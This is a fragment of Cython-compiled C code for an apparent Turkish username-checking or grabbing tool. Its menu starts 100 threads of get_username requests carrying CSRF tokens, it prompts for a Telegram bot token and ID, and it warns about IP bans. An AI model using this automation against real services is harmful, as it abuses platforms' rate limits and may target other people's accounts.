              __Pyx_XGIVEREF(__pyx_t_20);
              __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_14, __pyx_t_20);
            }
            __Pyx_XGIVEREF(__pyx_t_10);
            __Pyx_XGIVEREF(__pyx_t_13);
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_ErrRestore(__pyx_t_10, __pyx_t_13, __pyx_t_12);
            __pyx_t_10 = 0; __pyx_t_13 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_14 = 0; __pyx_t_20 = 0;
            __pyx_lineno = __pyx_t_17; __pyx_clineno = __pyx_t_18; __pyx_filename = __pyx_t_19;
            goto __pyx_L7_except_error;
          }
          __pyx_L37:;
        }
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        goto __pyx_L6_exception_handled;
      }
      goto __pyx_L7_except_error;
      __pyx_L7_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L6_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L12_try_end:;
    }
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_AddTraceback("source.get_username", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_csrftoken);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_f);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_9dosyasil(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_9dosyasil = {"dosyasil", (PyCFunction)__pyx_pw_6source_9dosyasil, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_9dosyasil(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("dosyasil (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_8dosyasil(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8dosyasil(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("dosyasil", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 751, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_remove); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 751, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_u_thomas_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_thomas_txt);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 751, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 752, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    
    __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_7) {
      __Pyx_AddTraceback("source.dosyasil", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_6, &__pyx_t_5) < 0) __PYX_ERR(0, 753, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_5);

      
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__2, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 754, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("source.dosyasil", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_11ana_menu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_11ana_menu = {"ana_menu", (PyCFunction)__pyx_pw_6source_11ana_menu, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_11ana_menu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("ana_menu (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_10ana_menu(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_10ana_menu(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_secim = NULL;
  CYTHON_UNUSED long __pyx_v_i;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_t_3;
  long __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("ana_menu", 0);

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__35, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 758, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Multiply(__pyx_kp_u_1_39m, __pyx_int_60); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 764, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 764, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 766, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_v_secim = __pyx_t_2;
  __pyx_t_2 = 0;

  
  __pyx_t_3 = (__Pyx_PyUnicode_Equals(__pyx_v_secim, __pyx_kp_u_1_2, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 768, __pyx_L1_error)
  if (__pyx_t_3) {

    
    for (__pyx_t_4 = 0; __pyx_t_4 < 0x64; __pyx_t_4+=1) {
      __pyx_v_i = __pyx_t_4;

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Thread); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 770, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 770, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_get_username); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 770, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_target, __pyx_t_6) < 0) __PYX_ERR(0, 770, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 770, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_start); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 770, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 770, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }

    
    goto __pyx_L3;
  }

  
  __pyx_t_3 = (__Pyx_PyUnicode_Equals(__pyx_v_secim, __pyx_kp_u_2, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 771, __pyx_L1_error)
  if (__pyx_t_3) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_Sajad); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 772, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 772, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    goto __pyx_L3;
  }

  
  __pyx_t_3 = (__Pyx_PyUnicode_Equals(__pyx_v_secim, __pyx_kp_u_3, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 773, __pyx_L1_error)
  if (__pyx_t_3) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_dosyasil); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 774, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_6)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_6);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_2 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 774, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
  }
  __pyx_L3:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.ana_menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_secim);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 1, 0, 0},
  {&__pyx_kp_u_009f03b18280bb343b0862d663f31ac8, __pyx_k_009f03b18280bb343b0862d663f31ac8, sizeof(__pyx_k_009f03b18280bb343b0862d663f31ac8), 0, 1, 0, 0},
  {&__pyx_kp_u_0_2, __pyx_k_0_2, sizeof(__pyx_k_0_2), 0, 1, 0, 0},
  {&__pyx_kp_u_0_3, __pyx_k_0_3, sizeof(__pyx_k_0_3), 0, 1, 0, 0},
  {&__pyx_kp_u_0_8, __pyx_k_0_8, sizeof(__pyx_k_0_8), 0, 1, 0, 0},
  {&__pyx_kp_u_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 1, 0, 0},
  {&__pyx_kp_u_1001, __pyx_k_1001, sizeof(__pyx_k_1001), 0, 1, 0, 0},
  {&__pyx_kp_u_100118, __pyx_k_100118, sizeof(__pyx_k_100118), 0, 1, 0, 0},
  {&__pyx_kp_u_1011900369, __pyx_k_1011900369, sizeof(__pyx_k_1011900369), 0, 1, 0, 0},
  {&__pyx_kp_u_10_0_0, __pyx_k_10_0_0, sizeof(__pyx_k_10_0_0), 0, 1, 0, 0},
  {&__pyx_kp_u_1217981644879628, __pyx_k_1217981644879628, sizeof(__pyx_k_1217981644879628), 0, 1, 0, 0},
  {&__pyx_kp_u_129477, __pyx_k_129477, sizeof(__pyx_k_129477), 0, 1, 0, 0},
  {&__pyx_kp_u_13_0_0, __pyx_k_13_0_0, sizeof(__pyx_k_13_0_0), 0, 1, 0, 0},
  {&__pyx_kp_u_1707104597_347, __pyx_k_1707104597_347, sizeof(__pyx_k_1707104597_347), 0, 1, 0, 0},
  {&__pyx_kp_u_1_000, __pyx_k_1_000, sizeof(__pyx_k_1_000), 0, 1, 0, 0},
  {&__pyx_kp_u_1_2, __pyx_k_1_2, sizeof(__pyx_k_1_2), 0, 1, 0, 0},
  {&__pyx_kp_u_1_31m, __pyx_k_1_31m, sizeof(__pyx_k_1_31m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_31m_P_BAN_YEDN_UAK_MODU_YAP, __pyx_k_1_31m_P_BAN_YEDN_UAK_MODU_YAP, sizeof(__pyx_k_1_31m_P_BAN_YEDN_UAK_MODU_YAP), 0, 1, 0, 0},
  {&__pyx_kp_u_1_32m, __pyx_k_1_32m, sizeof(__pyx_k_1_32m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_32m_Telegram_Token_Giriniz, __pyx_k_1_32m_Telegram_Token_Giriniz, sizeof(__pyx_k_1_32m_Telegram_Token_Giriniz), 0, 1, 0, 0},
  {&__pyx_kp_u_1_33m, __pyx_k_1_33m, sizeof(__pyx_k_1_33m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_34m, __pyx_k_1_34m, sizeof(__pyx_k_1_34m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_35m, __pyx_k_1_35m, sizeof(__pyx_k_1_35m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_36m, __pyx_k_1_36m, sizeof(__pyx_k_1_36m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_36m_Telegram_ID_Giriniz, __pyx_k_1_36m_Telegram_ID_Giriniz, sizeof(__pyx_k_1_36m_Telegram_ID_Giriniz), 0, 1, 0, 0},
  {&__pyx_kp_u_1_37m, __pyx_k_1_37m, sizeof(__pyx_k_1_37m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_39m, __pyx_k_1_39m, sizeof(__pyx_k_1_39m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_39m_2, __pyx_k_1_39m_2, sizeof(__pyx_k_1_39m_2), 0, 1, 0, 0},
  {&__pyx_kp_u_1_39m_Seciminiz, __pyx_k_1_39m_Seciminiz, sizeof(__pyx_k_1_39m_Seciminiz), 0, 1, 0, 0},
  {&__pyx_kp_u_1_97m, __pyx_k_1_97m, sizeof(__pyx_k_1_97m), 0, 1, 0, 0},
  {&__pyx_kp_u_1gI1BSItuCt7GpIB7BL3KCrapTfKligx, __pyx_k_1gI1BSItuCt7GpIB7BL3KCrapTfKligx, sizeof(__pyx_k_1gI1BSItuCt7GpIB7BL3KCrapTfKligx), 0, 1, 0, 0},
  {&__pyx_kp_u_1kbps, __pyx_k_1kbps, sizeof(__pyx_k_1kbps), 0, 1, 0, 0},
  {&__pyx_kp_u_2, __pyx_k_2, sizeof(__pyx_k_2), 0, 1, 0, 0},
  {&__pyx_kp_u_200639, __pyx_k_200639, sizeof(__pyx_k_200639), 0, 1, 0, 0},
  {&__pyx_kp_u_22021211RG, __pyx_k_22021211RG, sizeof(__pyx_k_22021211RG), 0, 1, 0, 0},
  {&__pyx_kp_u_2219789_22_3a_22_VC_x0R6_22_2c, __pyx_k_2219789_22_3a_22_VC_x0R6_22_2c, sizeof(__pyx_k_2219789_22_3a_22_VC_x0R6_22_2c), 0, 1, 0, 0},
  {&__pyx_kp_u_2_31m, __pyx_k_2_31m, sizeof(__pyx_k_2_31m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_32m, __pyx_k_2_32m, sizeof(__pyx_k_2_32m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_34m, __pyx_k_2_34m, sizeof(__pyx_k_2_34m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_35m, __pyx_k_2_35m, sizeof(__pyx_k_2_35m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_36m, __pyx_k_2_36m, sizeof(__pyx_k_2_36m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_39_40m, __pyx_k_2_39_40m, sizeof(__pyx_k_2_39_40m), 0, 1, 0, 0},
  {&__pyx_kp_u_2b712457_ffad_4dba_9241_29ea2f47, __pyx_k_2b712457_ffad_4dba_9241_29ea2f47, sizeof(__pyx_k_2b712457_ffad_4dba_9241_29ea2f47), 0, 1, 0, 0},
  {&__pyx_kp_u_3, __pyx_k_3, sizeof(__pyx_k_3), 0, 1, 0, 0},
  {&__pyx_kp_u_30m, __pyx_k_30m, sizeof(__pyx_k_30m), 0, 1, 0, 0},
  {&__pyx_kp_u_364, __pyx_k_364, sizeof(__pyx_k_364), 0, 1, 0, 0},
  {&__pyx_kp_u_38, __pyx_k_38, sizeof(__pyx_k_38), 0, 1, 0, 0},
  {&__pyx_kp_u_38_2_255_165_0m, __pyx_k_38_2_255_165_0m, sizeof(__pyx_k_38_2_255_165_0m), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5_117m1_38_5_231m_Listeyi_Ol, __pyx_k_38_5_117m1_38_5_231m_Listeyi_Ol, sizeof(__pyx_k_38_5_117m1_38_5_231m_Listeyi_Ol), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5_200m, __pyx_k_38_5_200m, sizeof(__pyx_k_38_5_200m), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5_208m, __pyx_k_38_5_208m, sizeof(__pyx_k_38_5_208m), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5_21m, __pyx_k_38_5_21m, sizeof(__pyx_k_38_5_21m), 0, 1, 0, 0},
  {&__pyx_kp_u_393, __pyx_k_393, sizeof(__pyx_k_393), 0, 1, 0, 0},
  {&__pyx_kp_u_3_33m, __pyx_k_3_33m, sizeof(__pyx_k_3_33m), 0, 1, 0, 0},
  {&__pyx_kp_u_3brTvw, __pyx_k_3brTvw, sizeof(__pyx_k_3brTvw), 0, 1, 0, 0},
  {&__pyx_kp_u_4, __pyx_k_4, sizeof(__pyx_k_4), 0, 1, 0, 0},
  {&__pyx_kp_u_567067343352427, __pyx_k_567067343352427, sizeof(__pyx_k_567067343352427), 0, 1, 0, 0},
  {&__pyx_kp_u_624, __pyx_k_624, sizeof(__pyx_k_624), 0, 1, 0, 0},
  {&__pyx_kp_u_7666785636679494, __pyx_k_7666785636679494, sizeof(__pyx_k_7666785636679494), 0, 1, 0, 0},
  {&__pyx_kp_u_936619743392459, __pyx_k_936619743392459, sizeof(__pyx_k_936619743392459), 0, 1, 0, 0},
  {&__pyx_n_s_A, __pyx_k_A, sizeof(__pyx_k_A), 0, 0, 1, 1},
  {&__pyx_kp_u_AR_AR, __pyx_k_AR_AR, sizeof(__pyx_k_AR_AR), 0, 1, 0, 0},
  {&__pyx_n_u_Accept, __pyx_k_Accept, sizeof(__pyx_k_Accept), 0, 1, 0, 1},
  {&__pyx_kp_u_Accept_Encoding, __pyx_k_Accept_Encoding, sizeof(__pyx_k_Accept_Encoding), 0, 1, 0, 0},
  {&__pyx_kp_u_Accept_Language, __pyx_k_Accept_Language, sizeof(__pyx_k_Accept_Language), 0, 1, 0, 0},
  {&__pyx_kp_u_Android, __pyx_k_Android, sizeof(__pyx_k_Android), 0, 1, 0, 0},
  {&__pyx_kp_u_Api_Aktif, __pyx_k_Api_Aktif, sizeof(__pyx_k_Api_Aktif), 0, 1, 0, 0},
  {&__pyx_n_s_B, __pyx_k_B, sizeof(__pyx_k_B), 0, 0, 1, 1},
  {&__pyx_n_s_BCyan, __pyx_k_BCyan, sizeof(__pyx_k_BCyan), 0, 0, 1, 1},
  {&__pyx_n_s_BGreen, __pyx_k_BGreen, sizeof(__pyx_k_BGreen), 0, 0, 1, 1},
  {&__pyx_n_s_BL, __pyx_k_BL, sizeof(__pyx_k_BL), 0, 0, 1, 1},
  {&__pyx_n_s_BPurple, __pyx_k_BPurple, sizeof(__pyx_k_BPurple), 0, 0, 1, 1},
  {&__pyx_n_s_BRed, __pyx_k_BRed, sizeof(__pyx_k_BRed), 0, 0, 1, 1},
  {&__pyx_n_s_BWhite, __pyx_k_BWhite, sizeof(__pyx_k_BWhite), 0, 0, 1, 1},
  {&__pyx_n_s_BYellow, __pyx_k_BYellow, sizeof(__pyx_k_BYellow), 0, 0, 1, 1},
  {&__pyx_n_s_B_2, __pyx_k_B_2, sizeof(__pyx_k_B_2), 0, 0, 1, 1},
  {&__pyx_n_s_BaseException, __pyx_k_BaseException, sizeof(__pyx_k_BaseException), 0, 0, 1, 1},
  {&__pyx_n_s_C, __pyx_k_C, sizeof(__pyx_k_C), 0, 0, 1, 1},
  {&__pyx_n_s_C1, __pyx_k_C1, sizeof(__pyx_k_C1), 0, 0, 1, 1},
  {&__pyx_n_u_Canary, __pyx_k_Canary, sizeof(__pyx_k_Canary), 0, 1, 0, 1},
  {&__pyx_n_u_Connection, __pyx_k_Connection, sizeof(__pyx_k_Connection), 0, 1, 0, 1},
  {&__pyx_n_s_Console, __pyx_k_Console, sizeof(__pyx_k_Console), 0, 0, 1, 1},
  {&__pyx_kp_u_Content_Length, __pyx_k_Content_Length, sizeof(__pyx_k_Content_Length), 0, 1, 0, 0},
